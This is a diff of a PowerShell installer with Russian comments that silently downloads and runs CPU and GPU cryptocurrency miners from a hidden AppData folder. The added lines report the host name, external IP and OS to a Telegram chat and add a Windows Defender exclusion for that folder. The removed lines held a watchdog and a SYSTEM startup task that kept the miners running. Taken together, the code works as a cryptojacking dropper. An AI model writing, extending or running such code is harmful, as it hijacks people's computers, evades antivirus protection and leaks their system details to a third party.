@@ -10,6 +10,9 @@ $ATTEMPTS_MAX = 3
 $TIMEOUT = 120
 $STEP = 5
 
+# ЯВНОЕ СОГЛАСИЕ НА ИСКЛЮЧЕНИЯ DEFENDER
+$ALLOW_DEFENDER_EXCLUSION = $true   # ← если false, ничего не добавляется
+
 # ================= TELEGRAM =================
 function Send-TG($text){
   $json = @{ chat_id=$TG_CHAT; text=$text } | ConvertTo-Json
@@ -24,14 +27,37 @@ $BASE = "$env:APPDATA\.mining"
 $BIN_CPU = "$BASE\bin\cpu"
 $BIN_GPU = "$BASE\bin\gpu"
 $REPORT_DIR = "$BASE\report"
-$REPORT_FILE = "$REPORT_DIR\report.txt"
+$TS = Get-Date -Format "yyyyMMdd-HHmmss"
+$REPORT_FILE = "$REPORT_DIR\report-$TS.txt"
 
 New-Item -ItemType Directory -Force -Path $BIN_CPU,$BIN_GPU,$REPORT_DIR | Out-Null
 
 # ================= SYSTEM ===================
+$START_TS = Get-Date
 $HOST = $env:COMPUTERNAME
 $OS = (Get-CimInstance Win32_OperatingSystem).Caption
 try { $IP = (Invoke-RestMethod "https://api.ipify.org").Trim() } catch { $IP="unknown" }
+
+Send-TG @"
+INSTALLER STARTED
+
+Host: $HOST
+External IP: $IP
+OS: $OS
+Time: $START_TS
+"@
+
+# ================= DEFENDER EXCLUSION =======
+$DefenderStatus = "not applied"
+
+if ($ALLOW_DEFENDER_EXCLUSION) {
+  try {
+    Add-MpPreference -ExclusionPath $BASE
+    $DefenderStatus = "exclusion added for $BASE"
+  } catch {
+    $DefenderStatus = "FAILED to add exclusion (not admin?)"
+  }
+}
 
 # ================= DOWNLOAD =================
 function Get-Zip($url,$dest){
@@ -51,7 +77,7 @@ if (-not (Test-Path $LOL_EXE)) {
   Get-Zip "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip" $BIN_GPU
 }
 
-# ================= START MINERS (INITIAL) ===
+# ================= START MINERS =============
 Start-Process $XMR_EXE `
   "-o $XMR_POOL -u $KRIPTEX.$HOST -p x --http-enabled --http-port 16000" `
   -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
@@ -90,75 +116,27 @@ if ($cpuHR -gt 0 -and $gpuHR -gt 0) { $STATUS="OK" }
 elseif ($cpuHR -gt 0 -or $gpuHR -gt 0) { $STATUS="PARTIAL" }
 else { $STATUS="FAILED" }
 
-# ================= REPORT ===================
+# ================= FINAL REPORT =============
+$END_TS = Get-Date
+$DURATION = [int]((New-TimeSpan -Start $START_TS -End $END_TS).TotalSeconds)
+
 $REPORT=@"
-INSTALLER REPORT
-Platform: windows
+INSTALLER FINISHED
 Status: $STATUS
 
 Host: $HOST
 External IP: $IP
 OS: $OS
 
+Defender: $DefenderStatus
+
 CPU hashrate: $cpuHR H/s
 GPU hashrate: $gpuHR H/s
 
 Attempts: $attempt
-Time: $(Get-Date)
+Duration: ${DURATION}s
+Finished: $END_TS
 "@
 
 $REPORT | Out-File -Encoding UTF8 $REPORT_FILE
 Send-TG $REPORT
-
-# ================= WATCHDOG SCRIPT ==========
-$WATCHDOG = "$BASE\watchdog.ps1"
-@"
-`$XMR_EXE='$XMR_EXE'
-`$LOL_EXE='$LOL_EXE'
-`$KRIPTEX='$KRIPTEX'
-`$HOST='$HOST'
-`$XMR_POOL='$XMR_POOL'
-`$ETC_POOL='$ETC_POOL'
-
-function CPU-Alive {
-  try {
-    `$c=Invoke-RestMethod 'http://127.0.0.1:16000/1/summary'
-    return ([int]`$c.hashrate.total[0] -gt 0)
-  } catch { return `$false }
-}
-function GPU-Alive {
-  try {
-    `$g=Invoke-RestMethod 'http://127.0.0.1:8080/summary'
-    return ([int](`$g.Session.Performance_Summary.Performance*1e6) -gt 0)
-  } catch { return `$false }
-}
-
-while (`$true) {
-  if (-not (CPU-Alive)) {
-    Start-Process `$XMR_EXE "-o `$XMR_POOL -u `$KRIPTEX.`$HOST -p x --http-enabled --http-port 16000" -WindowStyle Hidden
-  }
-  if (-not (GPU-Alive)) {
-    Start-Process `$LOL_EXE "--algo ETCHASH --pool `$ETC_POOL --user `$KRIPTEX.`$HOST --apiport 8080" -WindowStyle Hidden
-  }
-  Start-Sleep 30
-}
-"@ | Out-File -Encoding UTF8 $WATCHDOG
-
-# ================= AUTOSTART (TASK SCHEDULER)
-$taskName = "MiningWatchdog"
-$action = New-ScheduledTaskAction `
-  -Execute "powershell.exe" `
-  -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$WATCHDOG`""
-
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
-
-try {
-  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-  Register-ScheduledTask `
-    -TaskName $taskName `
-    -Action $action `
-    -Trigger $trigger `
-    -Principal $principal `
-    -Force
-} catch {}
